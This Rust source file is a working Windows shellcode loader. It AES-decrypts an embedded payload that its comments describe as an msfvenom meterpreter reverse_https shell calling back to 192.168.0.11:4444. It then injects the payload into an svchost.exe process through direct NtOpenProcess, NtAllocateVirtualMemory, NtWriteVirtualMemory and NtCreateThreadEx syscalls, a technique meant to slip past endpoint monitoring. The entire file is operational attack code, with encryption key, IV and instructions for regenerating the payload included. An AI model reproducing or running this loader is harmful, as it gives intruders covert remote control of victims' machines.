#![allow(non_snake_case)]
use libaes::Cipher;
use ntapi::ntapi_base::CLIENT_ID;
use rust_syscalls::syscall;
use std::mem::size_of;
use sysinfo::{ProcessExt, System, SystemExt};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES, PVOID};
use winapi::um::winnt::{
    MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    PAGE_NOACCESS, PAGE_READWRITE, PROCESS_ALL_ACCESS, PROCESS_VM_READ, PROCESS_VM_WRITE,
    THREAD_ALL_ACCESS,
};

fn main() {
    let key: [u8; 16] = [
        0x4f, 0x20, 0x08, 0xd7, 0x2f, 0x29, 0xb5, 0xec, 0x5c, 0xc3, 0xbf, 0xef, 0x6f, 0x99, 0xbb,
        0xbd,
    ];
    let iv: [u8; 16] = [
        0x00, 0xc9, 0x13, 0x92, 0xb6, 0x5d, 0xaa, 0xd1, 0xc9, 0xb9, 0x68, 0x2b, 0x0f, 0x7c, 0x58,
        0xd8,
    ];

    // generate payload with msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.11 LPORT=4444 -f rust
    // encrypt with https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'4f%2020%2008%20d7%202f%2029%20b5%20ec%205c%20c3%20bf%20ef%206f%2099%20bb%20bd'%7D,%7B'option':'Hex','string':'00%20c9%2013%2092%20b6%205d%20aa%20d1%20c9%20b9%2068%202b%200f%207c%2058%20d8'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Hex('0x%20with%20comma',0)
    let shellcode_encrypted: [u8; 512] = [
        0xd8, 0xfb, 0xd4, 0xe7, 0xad, 0x37, 0x8e, 0xd2, 0x9c, 0x49, 0xcf, 0x50, 0xee, 0x92, 0xe7,
        0xad, 0x5d, 0xcd, 0x8c, 0x6a, 0xbe, 0x4d, 0xd7, 0x49, 0xff, 0x20, 0x79, 0x9b, 0x50, 0x66,
        0xc3, 0x7d, 0xb1, 0x55, 0x19, 0x56, 0x38, 0x9b, 0x2a, 0x3e, 0xa1, 0x2d, 0xfd, 0xd7, 0x99,
        0x6a, 0xa8, 0xe8, 0xf9, 0xa4, 0x2e, 0xb2, 0x30, 0x61, 0x0a, 0xf1, 0x75, 0x82, 0x2d, 0x91,
        0x97, 0xaf, 0x4a, 0x30, 0x7d, 0x91, 0x76, 0x3e, 0xf3, 0x42, 0xde, 0x23, 0x2e, 0xfc, 0x29,
        0x75, 0x07, 0x6f, 0x4f, 0xd6, 0x60, 0xb6, 0x48, 0x56, 0x9a, 0xce, 0xa9, 0x82, 0x80, 0x04,
        0xb8, 0x8c, 0xe8, 0xce, 0xa9, 0xec, 0xde, 0xed, 0xe5, 0xed, 0xc4, 0x61, 0x5d, 0xe1, 0x07,
        0x99, 0x3e, 0xfe, 0x5e, 0x0e, 0x61, 0x67, 0xc7, 0xa3, 0x9f, 0xb9, 0x69, 0xa0, 0x08, 0x1a,
        0x0a, 0x44, 0xc5, 0x2f, 0x30, 0x3c, 0xa4, 0xc0, 0xef, 0xe6, 0xdc, 0x0e, 0x3c, 0xbe, 0x34,
        0x9a, 0x05, 0x07, 0x34, 0x6b, 0x11, 0xee, 0x4d, 0xef, 0x7b, 0x01, 0xf4, 0x5b, 0xfc, 0x42,
        0x5f, 0xff, 0xf4, 0x4c, 0xa2, 0xd1, 0xa0, 0xa4, 0xdf, 0x5e, 0xd3, 0xe8, 0x70, 0xd3, 0x6f,
        0x57, 0x3c, 0x8e, 0x79, 0xac, 0x22, 0x54, 0x2b, 0x07, 0x57, 0x41, 0x8f, 0xca, 0xac, 0xc2,
        0xdc, 0x48, 0xa6, 0xda, 0x78, 0x0b, 0x85, 0x35, 0x15, 0x1a, 0xd8, 0x42, 0x68, 0x5c, 0x83,
        0xcf, 0xb2, 0x4b, 0xb5, 0xf2, 0xb1, 0x2b, 0xdf, 0x0f, 0xd7, 0x29, 0xe8, 0x2d, 0xad, 0x77,
        0xfd, 0x6b, 0x97, 0x16, 0xc9, 0x24, 0xc9, 0x86, 0x86, 0x78, 0x69, 0xf1, 0xd2, 0x84, 0x41,
        0xf4, 0xc4, 0x99, 0x62, 0xee, 0xcf, 0x70, 0xcf, 0x8f, 0xbd, 0x60, 0x49, 0xe2, 0x02, 0x21,
        0xc0, 0xf2, 0x48, 0x75, 0x7c, 0x67, 0x40, 0x04, 0xaf, 0x6e, 0xb7, 0x3f, 0x72, 0x2d, 0x22,
        0x29, 0x21, 0xa0, 0xc6, 0x5e, 0x60, 0x80, 0x77, 0xbd, 0xf5, 0x76, 0x6a, 0x7b, 0x62, 0x39,
        0x57, 0x12, 0xf9, 0xca, 0x3b, 0x15, 0xc1, 0xb4, 0xcd, 0x98, 0xcb, 0xb3, 0x1b, 0x95, 0x7e,
        0xd5, 0xf5, 0x90, 0xb9, 0x8c, 0xec, 0xdd, 0x95, 0xd2, 0x57, 0x59, 0x8f, 0x79, 0xd0, 0x12,
        0x51, 0x04, 0x90, 0xf4, 0xb8, 0xa8, 0xa7, 0xc1, 0x04, 0x35, 0x83, 0x03, 0x41, 0x36, 0x11,
        0xec, 0x7e, 0x35, 0x2c, 0xe6, 0xb2, 0x7f, 0xd3, 0x18, 0xe4, 0x71, 0x4f, 0x68, 0xb4, 0x00,
        0x9d, 0xe6, 0xbb, 0xc8, 0x62, 0x81, 0x81, 0xea, 0x1f, 0x57, 0xb0, 0x15, 0x94, 0xe0, 0x79,
        0x86, 0x64, 0xba, 0xb1, 0xab, 0x74, 0x3b, 0xcb, 0x70, 0xc3, 0x94, 0xad, 0x9e, 0x60, 0xea,
        0x0c, 0xd6, 0x9a, 0x31, 0x48, 0xe2, 0x2b, 0xad, 0x84, 0x06, 0xfc, 0x1d, 0xd1, 0x0f, 0x8b,
        0x8e, 0xb6, 0x06, 0xaf, 0x92, 0x6c, 0xb8, 0x9f, 0xac, 0xc3, 0x9f, 0x45, 0x85, 0x7f, 0x5a,
        0x65, 0x47, 0x44, 0xff, 0x21, 0x54, 0x14, 0x1b, 0xa0, 0x90, 0xf7, 0xc4, 0x79, 0x6e, 0xef,
        0xc2, 0xd0, 0x3b, 0x18, 0x01, 0xe7, 0x68, 0x97, 0x4c, 0x76, 0xa3, 0x74, 0x39, 0x96, 0x37,
        0x0e, 0x36, 0xa4, 0x46, 0x4b, 0x2b, 0x24, 0x9d, 0xd7, 0xf1, 0x14, 0xbc, 0x16, 0xe0, 0x76,
        0x5b, 0x41, 0x2b, 0xe4, 0xca, 0xdf, 0xb1, 0x0a, 0x7a, 0xe9, 0xa5, 0xf8, 0x0d, 0xc2, 0x03,
        0x9c, 0x32, 0xea, 0xc5, 0x9c, 0x8d, 0xea, 0xbd, 0x57, 0xbe, 0xf0, 0xf1, 0xc5, 0x80, 0x17,
        0x98, 0xc2, 0x9d, 0x77, 0xf9, 0x23, 0x15, 0x9f, 0x47, 0x93, 0x07, 0xf0, 0x2f, 0x82, 0x62,
        0xd6, 0x23, 0x42, 0x1d, 0xc2, 0x0d, 0xb8, 0xc3, 0xfd, 0x60, 0xe3, 0x47, 0xcd, 0xf4, 0xf5,
        0x76, 0xe9, 0x89, 0x2e, 0x0d, 0x07, 0x6a, 0xa7, 0x92, 0xf4, 0xff, 0x63, 0x15, 0x05, 0xdd,
        0x60, 0x3a,
        ];

    let cipher = Cipher::new_128(&key);
    let buf = cipher.cbc_decrypt(&iv, &shellcode_encrypted[..]);

    let mut system = System::new();
    system.refresh_all();

    let mut process_id: usize = 0;

    for process in system.processes_by_name("svchost.exe") {
        process_id = usize::from(process.pid());
    }
    let pid: u64 = process_id as u64; //Process PID
    println!("pid: {:?}", pid);
    //    let pid: u64 = 11000; //Process PID
    let currentProcess: HANDLE = -1isize as _;
    let mem_info_len: usize = size_of::<MEMORY_BASIC_INFORMATION>() as _;

    let mut handle: HANDLE = NULL;
    let mut status: NTSTATUS;

    let mem_info: MEMORY_BASIC_INFORMATION = MEMORY_BASIC_INFORMATION {
        BaseAddress: NULL,
        AllocationBase: NULL,
        AllocationProtect: 0,
        RegionSize: 0,
        State: 0,
        Protect: 0,
        Type: 0,
    };

    let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as _,
        RootDirectory: NULL,
        ObjectName: NULL as _,
        Attributes: 0,
        SecurityDescriptor: NULL,
        SecurityQualityOfService: NULL,
    };

    let cid: CLIENT_ID = CLIENT_ID {
        UniqueProcess: pid as _,
        UniqueThread: 0 as _,
    };

    unsafe {
        status = syscall!("NtOpenProcess", &mut handle, PROCESS_ALL_ACCESS, &oa, &cid);
    }

    println!("\n\t[-] NtOpenProcess status: {:#02X}", status);

    if status != 0 {
        return;
    }

    let mut addr: PVOID = NULL;
    let mut size: u64 = buf.len().try_into().unwrap();
    status = unsafe {
        syscall!(
            "NtAllocateVirtualMemory",
            handle,
            &mut addr,
            0 as u64,
            &mut size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        )
    };

    if status != 0 {
        println!("Failed at allocating mem: {:#x}", status);
        return;
    }

    println!("\n\t[-] NtAllocateVirtualMemory addr: {:?}", addr);

    let mut nb_written_bytes = 0;
    let shellcode = buf.as_ptr() as PVOID;
    status = unsafe {
        syscall!(
            "NtWriteVirtualMemory",
            handle,
            addr,
            shellcode,
            buf.len() as u64,
            &mut nb_written_bytes
        )
    };

    if status != 0 {
        println!("Failed at NtWriteVirtualMemory: {:#x}", status);
        println!("Bytes written: {:?}", nb_written_bytes);
        return;
    }

    println!(
        "\n\t[-] NtWriteProcessMemory size: {:#02X}\n\t",
        nb_written_bytes
    );

    //    let mut oldProtect = 0;
    //    status = unsafe {
    //        syscall!(
    //            "NtProtectVirtualMemory",
    //            handle,
    //            addr,
    //            100,
    //            PAGE_EXECUTE_READWRITE,
    //            &mut oldProtect
    //        )
    //    };
    //
    //    if status != 0 {
    //        println!("Failed at NtProtectVirtualMemory: {:#x}", status);
    //        return;
    //    }
    //
    //    println!("Old protect: {:?}", oldProtect);
    //    println!(
    //        "\n\t[-] NtProtectVirtualMemory executed: {:#02X}\n\t",
    //        status
    //    );

    let mut new_thread: HANDLE = NULL;
    status = unsafe {
        syscall!(
            "NtCreateThreadEx",
            &mut new_thread,
            THREAD_ALL_ACCESS,
            NULL,
            handle,
            addr,
            NULL,
            0,
            0,
            0,
            0,
            NULL
        )
    };

    if status != 0 {
        println!("Failed at NtCreateThreadEx: {:#x}", status);
        println!("\n\t[-] NtCreateThreadEx handle: {:?}\n\t", new_thread);
        return;
    }

    println!("\n\t[-] NtCreateThreadEx handle: {:?}\n\t", new_thread);

    unsafe {
        status = syscall!("NtClose", handle);
    }

    println!("\t[-] NtClose       status: {:#02X}", status);
}
